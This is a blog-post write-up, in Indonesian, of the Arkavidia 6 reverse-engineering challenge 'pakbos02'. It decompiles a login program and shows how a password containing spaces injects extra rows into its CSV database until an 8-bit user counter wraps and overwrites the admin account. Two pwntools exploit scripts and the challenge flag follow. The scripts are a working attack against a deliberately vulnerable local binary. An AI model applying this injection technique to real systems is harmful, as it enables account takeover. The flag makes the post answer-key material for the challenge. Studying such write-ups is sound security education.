---
layout: post
title:  "[RE] pakbos02 - Arkavidia 6"
date:   2020-01-11 05:00:00
categories: ctf arkavidia
---
## Analisa
Diberikan dua buah file, ELF file `pakbos02` serta text file `database.csv`

```
> file pakbos02
pakbos02: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=044c556e1539794ae44ad52903a81e0d23b04623, not stripped
```

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

```
> cat database.csv
admin,username,password
1,PakBos,{REDACTED}
0,guest,guest
```

Program ketika dijalankan
```
.---------------- Welcome to -------------.
|       ✦    ✦       ✦   ✦          ✦      |
| ✦████ ██✦ █   ███    ✦    ███✦ ███   █   |
|  █  █   █ █   █  █✦ █   █ █  █ █ ✦█  █   |
|  ████ ███ █ █ ███  █ █ █  █✦ █ ███ ✦ █ ✦ |
|  █✦   █ █ ██  █  █ █ █  █ █  █ █  █   ✦  |
|✦ █    ███ █ █ ███   █  █✦ ███ ✦███   █   |
|           ✦        ✦                ✦  ✦ |
 '----------------------------------------'
1. login
2. logout
3. forgot password
4. save database
5. reset database
6. exit
> 
```

Terdapat beberapa fungsionalitas. Kita dapat login menggunakan akun `guest:guest` yang disediakan

Terlihat sepertinya tujuan dari chal ini adalah untuk mendapatkan password dari PakBos.

Berikut beberapa fungsi yang ada dalam program setelah didecompile dengan ghidra.

### main
```c

void main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  undefined4 inp_menu;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init(param_1);
  do {
    instruction();
    __isoc99_scanf(&DAT_001017fd,&inp_menu);
    switch(inp_menu) {
    default:
      puts("no such command");
      break;
    case 1:
      login();
      break;
    case 2:
      logout();
      break;
    case 3:
      forgotPass();
      break;
    case 4:
      write_db(path);
      read_db(path);
      break;
    case 5:
      read_db("./database.csv");
      break;
    case 6:
      puts("bye!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    putchar(10);
  } while( true );
}
```

### login
```c

undefined8 login(void)

{
  int matched;
  undefined8 uVar1;
  long in_FS_OFFSET;
  int i;
  char inp_username [32];
  char inp_password [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (loggedIn == 0) {
    printf("username: ");
    __isoc99_scanf(&DAT_0010143c,inp_username);
    printf("password: ");
    __isoc99_scanf(&DAT_0010143c,inp_password);
    i = 0;
    while (i < (int)(uint)count) {
      matched = strcmp(inp_username,database + (long)i * 0x44 + 4);
      if (matched == 0) {
        matched = strcmp(inp_password,database + (long)i * 0x44 + 0x24);
        if (matched == 0) {
          currentUser = (undefined)i;
          loggedIn = 1;
          uVar1 = 1;
          goto LAB_00100f2a;
        }
      }
      i = i + 1;
    }
    puts("no such user or wrong password");
    uVar1 = 0xffffffff;
  }
  else {
    puts("aleady logged in");
    uVar1 = 0xffffffff;
  }
LAB_00100f2a:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar1;
}
```

### forgotPass
```c

void forgotPass(void)
{
  int iVar1;
  
  if (loggedIn == 0) {
    puts("login first please");
  }
  else {
    printf("your password: %s\n",(long)(int)(uint)currentUser * 0x44 + 0x302084,
           (long)(int)(uint)currentUser * 0x44 + 0x20);
    printf("do you want to change your password? (y/n): ");
    getchar();
    iVar1 = getchar();
    if ((char)iVar1 == 'y') {
      changePass();
    }
  }
  return;
}
```

### changePass
```c
void changePass(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("new password: ");
  getchar();
  __isoc99_scanf("%31[^\n]",(long)(int)(uint)currentUser * 0x44 + 0x302084,
                 (long)(int)(uint)currentUser * 0x44 + 0x20);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

### write_db
```c
void write_db(char *param_1)

{
  FILE *__s;
  int i;
  
  __s = fopen(param_1,"w+");
  if (__s == (FILE *)0x0) {
    puts("pls contact the admin if this is on the remote server");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fwrite("admin,username,password\n",1,0x18,__s);
  i = 0;
  while (i < (int)(uint)count) {
    fprintf(__s,"%d,%s,%s\n",(ulong)*(uint *)(database + (long)i * 0x44),(long)i * 0x44 + 0x302064,
            (long)i * 0x44 + 0x302084);
    i = i + 1;
  }
  fclose(__s);
  printf("saved to %s\n",path);
  return;
}
```

### read_db
```c

void read_db(char *param_1)

{
  int iVar1;
  FILE *__stream;
  
  count = 0;
  __stream = fopen(param_1,"r");
  if (__stream == (FILE *)0x0) {
    puts("pls contact the admin if this is on the remote server");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  __isoc99_fscanf(__stream,"%*s,%*s");
  while( true ) {
    iVar1 = __isoc99_fscanf(__stream,"%d,%31[^,],%31s",database + (long)(int)(uint)count * 0x44,
                            (long)(int)(uint)count * 0x44 + 0x302064,
                            (long)(int)(uint)count * 0x44 + 0x302084);
    if (iVar1 != 3) break;
    count = count + 1;
  }
  fclose(__stream);
  return;
}
```

Terlihat terdapat perbedaan formatting ketika dilakukan `read_db` dengan `write_db`.
write_db:  
```c
fprintf(__s,"%d,%s,%s\n",...);
```

read_db:  
```c
__isoc99_fscanf(__stream,"%d,%31[^,],%31s",...);
```

`scanf` dengan argumen yang diberikan akan berhenti (selesai membaca suatu data ketika menemukan white space). Sementara `fprintf` tidak demikian, hanya berhenti ketika menemukan new line.

Ditambah lagi dengan adanaya fungsionalitas `changePass` yang dapat mengganti password user saat ini. Dengan ini apabila kita login dengan user `guest` lalu kita lakukan penggantian password menjadi `guest 0,new,new` maka entry di database akan menjadi sebagai berikut:  
```
admin,username,password
1,PakBos,{REDACTED}
0,guest,guest 0,new,new
```

Kemudian ketika dilakukan `read_db`, kita akan memiliki user baru dengan nama `new_user` serta password `new_user`.

Dari sini masih belum terlihat bagaimana cara melakukan eksploitasi agar bisa mendapatkan password `PakBos`, kemudian dilakukan disassembly serta debugging terhadap program. Ternyata variable count yang digunakan hanya berukuran 8bit.

Dengan begitu apabila kita bisa membuat user menjadi sebanyak 256 user, variable count akan kembali ke 0 dan mengoverwrite user `PakBos`.

Setelah user `PakBos` teroverwrite, kita dapat login sebagai user tersebut dengan nilai currentUser 0 lalu memanfaatkan fungsionalitas reset database yang membaca database asli dari soal. Fungsionalitas ini tidak mengubah nilai currentUser sehingga setelah database direset kita dapat melihat password asli dari `PakBos` dengan fitur forgot password. 

## Solve
Karena saya tidak solve soal ini waktu penyisihan, maka saya buat flag palsu di `database.csv` lalu run server di lokal.
```
socat -T10 tcp-l:12345,reuseaddr,fork exec:"./pakbos02"
```

Coba buat user satu persatu seperti di bawah ini tidak berhasil, karena setelah sampai di index-0 entah kenapa semua database hilang ketika disave.

```py
from pwn import *
r = remote('localhost',12345)

def login(user,password):
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('username: ')
    r.sendline(user)
    r.recvuntil('password: ')
    r.sendline(password)

def logout():
    r.recvuntil('> ')
    r.sendline('2')

def forgot():
    r.recvuntil('> ')
    r.sendline('3')
    r.recvuntil('your password: ')
    password = r.recvuntil('\n')[:-1]
    r.recvuntil('do you want to change your password? (y/n): ')
    r.sendline('n')
    return password

def changePassword(new_password):
    r.recvuntil('> ')
    r.sendline('3')
    r.recvuntil('do you want to change your password? (y/n): ')
    r.sendline('y')
    r.recvuntil('new password: ')
    r.sendline(new_password)

def save():
    r.recvuntil('> ')
    r.sendline('4')

def reset():
    r.recvuntil('> ')
    r.sendline('5')

login('guest', 'guest')
changePassword('guest 0,new0,new0')
save()
logout()
for i in range(255):
    login('new{}'.format(i),'new{}'.format(i))
    print forgot()
    changePassword('new{} 0,new{},new{}'.format(i,i+1,i+1))
    save()
    logout()

login('new254', 'new254')
reset()
print forgot()
```

Cara yang berhasil, sekali ganti password langsung buat 3 user.
```py
from pwn import *
r = remote('localhost', 12345)

def login(user,password):
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('username: ')
    r.sendline(user)
    r.recvuntil('password: ')
    r.sendline(password)

def logout():
    r.recvuntil('> ')
    r.sendline('2')

def forgot():
    r.recvuntil('> ')
    r.sendline('3')
    r.recvuntil('your password: ')
    password = r.recvuntil('\n')[:-1]
    r.recvuntil('do you want to change your password? (y/n): ')
    r.sendline('n')
    return password

def changePassword(new_password):
    r.recvuntil('> ')
    r.sendline('3')
    r.recvuntil('do you want to change your password? (y/n): ')
    r.sendline('y')
    r.recvuntil('new password: ')
    r.sendline(new_password)

def save():
    r.recvuntil('> ')
    r.sendline('4')

def reset():
    r.recvuntil('> ')
    r.sendline('5')

login('guest', 'guest')
for i in range(0, 255, 3):
    print i
    changePassword('a 0,{},{} 0,{},{} 0,{},{}'.format(i,i,i+1,i+1,i+2,i+2))
    save()
    logout()
    login(str(i+2),str(i+2))

reset()
print forgot()
```

## Flag
Arkav6{pakbos_DB_injection}